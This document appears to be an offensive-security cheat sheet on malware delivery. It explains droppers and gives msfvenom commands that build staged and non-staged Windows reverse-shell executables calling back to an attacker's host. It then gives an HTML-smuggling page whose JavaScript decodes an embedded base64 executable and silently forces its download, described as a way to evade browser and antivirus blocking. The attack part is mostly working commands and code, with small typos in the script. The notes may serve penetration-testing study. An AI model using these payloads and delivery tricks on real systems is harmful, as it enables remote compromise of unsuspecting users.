# Droppers

Droppers are the first stage payload which on executing contact a C2 server for the rest of the payload. Droppers can be effectively used to deliver small sized payloads which can easily bypass Antivirus and their only function is to get on the system and contact the C2 for furthur instructions.

msfvenom can be used to create payloads and the metasploit's multi handler can easily handle both staged and non-staged payloads.

Example payload creation :-

    Non-Staged payload :
    sudo msfvenom -p windows/shell_reverse_tcp LHOST=\<ip> LPORT=\<port> -f exe -o shell.exe

    Staged Payload :
    sudo msfvenom -p windows/shell/reverse_tcp LHOST=\<ip> LPORT=\<port> -f exe -o shell.exe

Non-Staged payloads are much smaller in size, the only difference in command between the two is the forwardslash.

Netcat or msfconsole can be used as a listener.

&nbsp;

# HTML Smuggling

The HTML anchor tag can be used to automatically download a file onto the computer when a hyperlink is clicked.

    <html>
        <body>
            <a href="/msfstaged.exe" download="msfstaged.exe">DownloadMe</a>
        </body>
    </html>

This however requires user interaction and also the filename is seen, the browser will block off such downloads almost instantly.

Javascript can be used to automatically download the file in form of octet stream. The steps are :

1. Store the payload in form of base64
2. Convert the base64 to byte array and store this in a variable
3. Create a Blob of octet stream.
4. Create a URL File object of the blob using the URL.createObjectURL() to stimulate the file being on a webserver.
5. Now create an anchor tag with the display set to none.
6. Set the href of the anchor tag to the URL file object.
7. Give the filename using \<tagname>.download
8. Stimulate a click using the \<tagname>.click

Code :-

    <html>
        <body>
            <script>
                function base64ToArrayBuffer(base64)
                {
                    var binary_string = window.atob(base64);
                    var len = binary_string.length;
                    var bytes = new Uint8Array( len );
                    for (var i = 0; i < len; i++)
                    {
                        bytes[i] = binary_string.charCodeAt(i);
                    }
                    return bytes.buffer;
                }

                var file ='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA...
                var data = base64ToArrayBuffer(file);
                var blob = new Blob([data], {type: octet/stream'});
                var fileName = 'msfstaged.exe';

                var a = document.createElement('a');
                document.body.appendChild(a);
                a.style = 'display: none';
                var url = window.URL.createObjectURLblob);
                a.href = url;
                a.download = fileName;
                a.click();
                window.URL.revokeObjectURL(url);
            </script>
        </body>
    </html>

&nbsp;

# Phising with Microsoft Office
